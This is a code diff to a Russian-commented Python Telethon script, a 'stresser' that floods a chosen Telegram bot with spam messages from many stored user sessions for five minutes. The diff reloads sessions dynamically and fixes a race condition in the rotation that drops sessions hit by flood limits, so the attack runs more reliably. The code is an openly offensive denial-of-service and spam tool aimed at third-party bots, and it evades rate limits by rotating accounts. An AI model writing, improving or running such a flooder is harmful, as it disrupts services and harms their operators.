@@ -39,7 +39,11 @@ STRESS_DURATION = 5 * 60  # 5 минут в секундах
 bot = None
 session_folder = 'sessions'
 os.makedirs(session_folder, exist_ok=True)
-sessions = [f.replace('.session', '') for f in os.listdir(session_folder) if f.endswith('.session')]
+
+
+def _get_sessions():
+    """Читает список сессий динамически при каждом запуске."""
+    return [f.replace('.session', '') for f in os.listdir(session_folder) if f.endswith('.session')]
 
 
 def set_bot_stress(b):
@@ -63,7 +67,7 @@ async def find_inline_button(bot_username: str) -> tuple[int | None, bytes | Non
     """
     from telethon.errors import AuthKeyDuplicatedError
 
-    for session in sessions:
+    for session in _get_sessions():
         api_str = random.choice(API)
         api_id, api_hash = api_str.split(':')
         client = TelegramClient(
@@ -131,7 +135,6 @@ async def _spam_callback_session(session: str, bot_username: str, msg_id: int, b
         await client.start()
         peer = await client.get_entity(bot_username)
         print(f"[STRESS] [{session}] ✅ Старт message-спама...", flush=True)
-
         chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
 
         while not stop_event.is_set():
@@ -205,7 +208,7 @@ async def main_bot_stress(bot_username: str, user_id: int, username: str, is_adm
         return False
 
     print(f"[STRESS] ✅ Кнопка найдена, запускаем ротационную атаку на {STRESS_DURATION//60} минут...", flush=True)
-    print(f"[STRESS] 📦 Сессий: {len(sessions)} | msg_id={msg_id} | btn_data={btn_data!r}", flush=True)
+    print(f"[STRESS] 📦 Сессий: {len(_get_sessions())} | msg_id={msg_id} | btn_data={btn_data!r}", flush=True)
     await bot.send_message(
         user_id,
         f"⚡️ *Стрессер запущен!*\n*└─ Цель: {bot_username}*\n*└─ Продолжительность: 5 минут*\n*└─ Ротация 2 сессии/сек × 3 сообщения*",
@@ -222,7 +225,7 @@ async def main_bot_stress(bot_username: str, user_id: int, username: str, is_adm
     clients = {}
     peers = {}
     print(f"[STRESS] 🔌 Подключаем сессии...", flush=True)
-    for s in sessions:
+    for s in _get_sessions():
         api_str = random.choice(API)
         api_id, api_hash = api_str.split(':')
         c = TelegramClient(f"./sessions/{s}", int(api_id), api_hash,
@@ -230,7 +233,6 @@ async def main_bot_stress(bot_username: str, user_id: int, username: str, is_adm
         try:
             await asyncio.wait_for(c.connect(), timeout=6)
             if await c.is_user_authorized():
-                await c.start()
                 peers[s] = await c.get_entity(bot_username)
                 clients[s] = c
         except Exception:
@@ -247,8 +249,13 @@ async def main_bot_stress(bot_username: str, user_id: int, username: str, is_adm
         await bot.send_message(user_id, "❌ *Нет валидных сессий!*", parse_mode="Markdown", reply_markup=keyboards.main_menu)
         return False
 
+    # Сессии на удаление собираем в set, чтобы избежать race condition при параллельном remove
+    sessions_to_remove = set()
+
     async def send_from_session(s: str):
         nonlocal total_sent
+        if s in sessions_to_remove:
+            return
         c = clients[s]
         peer = peers[s]
         for _ in range(3):
@@ -258,12 +265,20 @@ async def main_bot_stress(bot_username: str, user_id: int, username: str, is_adm
                 total_sent += 1
             except FloodWaitError as e:
                 print(f"[STRESS] [{s}] 🌊 FLOOD {e.seconds}s — убираем из ротации", flush=True)
-                valid_sessions.remove(s) if s in valid_sessions else None
+                sessions_to_remove.add(s)
                 return
             except Exception:
                 pass
 
     while time.time() < stop_time and valid_sessions:
+        # Очищаем помеченные сессии
+        if sessions_to_remove:
+            for s in sessions_to_remove:
+                if s in valid_sessions:
+                    valid_sessions.remove(s)
+            sessions_to_remove.clear()
+            if not valid_sessions:
+                break
         # Берём 2 сессии по кругу
         active = []
         for _ in range(2):
